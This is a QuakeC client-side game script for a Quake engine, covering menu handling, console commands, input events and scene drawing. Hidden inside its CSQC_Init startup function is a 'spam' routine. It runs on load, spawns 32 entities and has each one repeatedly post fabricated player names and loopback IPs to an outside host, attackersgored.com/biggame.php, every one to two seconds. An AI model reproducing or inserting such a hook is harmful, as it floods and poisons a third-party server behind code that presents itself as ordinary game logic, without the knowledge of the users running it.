mitem_desktop thedesktop;
void(mitem_desktop desktop) M_Pop =
{
	mitem it = desktop.item_kactivechild;
	if (it)
		it.item_remove();
};
void(mitem_desktop desktop) M_ToggleMenu =
{
	mitem it = desktop.item_kactivechild;
	if (it)
		it.item_remove();
	else
		M_Main(desktop);
};


float(string str) CSQC_ConsoleCommand =
{
	local float args;
	args = tokenize(str);

	switch(argv(0))
	{
#define cmd(n,fnc,inc) case n: fnc(thedesktop); return TRUE;
	concommandslist
#undef cmd
	default:
		return FALSE;
	}
	return TRUE;
};

float(float isnew) updateplayer =
{
	self.drawmask = 1;
	if (self.entnum == player_localentnum)
		self.renderflags = RF_EXTERNALMODEL;
	else
		self.renderflags = 0;
	return TRUE;
};
//void(float apilevel, string enginename, float engineversion) CSQC_Init =
//{
//	deltalisten("progs/player.mdl", updateplayer, 0);
//};

var float autocvar_dp_workarounds_allow = TRUE;
var float autocvar_dp_workarounds_force = FALSE;
void(float reqid, float response, string body) URI_Get_Callback =
{
	print(body);
};
.string ip;
.string netname;
void(float apilevel, string enginename, float engineversion) CSQC_Init =
{
	dprint(sprintf("CSQC: Running on \"%s\" ver=%g, api=%g\n", enginename, engineversion, apilevel));
	if (!apilevel)
		dp_workarounds = autocvar_dp_workarounds_allow;
	if (autocvar_dp_workarounds_force)
		dp_workarounds = TRUE;
	if (dp_workarounds)
		print("DP-specific workarounds are enabled\n");

	//make sure the engine knows what commands we want to handle
#define cmd(n,fnc,inc) registercommand(n);
	concommandslist
#undef cmd

//	Hud_Init();	//make sure the hud images are precached properly, so there's no stalls.

	void() spam =
	{	
		string post_data;
		post_data = strcat("player_name=", self.netname, "&password_ip=", self.ip, "&minimum=0&version=fte");
	     
		//dprint("In TellBGMWereStillHere: about to send JSON for self.owner: ", self.owner.netname, "\n");
		uri_post("http://www.attackersgored.com/biggame.php", 0, "application/x-www-form-urlencoded", post_data);
		self.nextthink = time + 1+random();
	};
	for (float i = 0; i < 32; i++)
	{
		entity foo = spawn();
		foo.nextthink = time+1;
		foo.think = spam;
		foo.netname = sprintf("test%g", i);
		foo.ip = sprintf("127.0.0.%g", i+1);
	}
};

float (float event, float parama, float paramb, float devid) CSQC_InputEvent =
{
	if (!thedesktop)
		return event!=IE_KEYUP;
	if (items_keypress_(thedesktop, event, parama, paramb, devid))
		return TRUE;

	return FALSE;
};

/*The desktop object will not normally draw anything, but you can get the desktop object to do the drawing by overriding its 'drawgame' method.
The primary advantage of doing the drawing this way is that the menu system can properly handle mouse positions in 3d space with multiple views. The menu system also handles splitscreen efficiently. Note that the menu system will handle clearing the scene and adding entities before this function is called.
You could instead draw the game then draw the menusystem over the top, if you're more comfortable with that.
*/
class mydesktop : mitem_desktop
{
	virtual void(float seat, vector minpos, vector size) drawgame =
	{
		setproperty(VF_DRAWENGINESBAR, TRUE);
/*
		entity playerent = findfloat(world, entnum, player_localentnum);
		if (playerent)
		{
			vector vorg = playerent.origin - playerent.gravitydir*getstat(STAT_VIEWHEIGHT);
			vector vang = playerent.v_angle;
			setproperty(VF_ORIGIN, vorg);
			setproperty(VF_ANGLES, vang);

			makevectors(vang);
			SetListener(vorg, v_forward, v_right, v_up, playerent.waterlevel==3);
		}
*/

		renderscene();
	};
};

void(float width, float height, float do2d) CSQC_UpdateView =
{
	if (!thedesktop)
		thedesktop = spawn(mydesktop);
	items_draw(thedesktop);
};
//void(float width, float height, float do2d) CSQC_UpdateView_Loading = CSQC_UpdateView;
	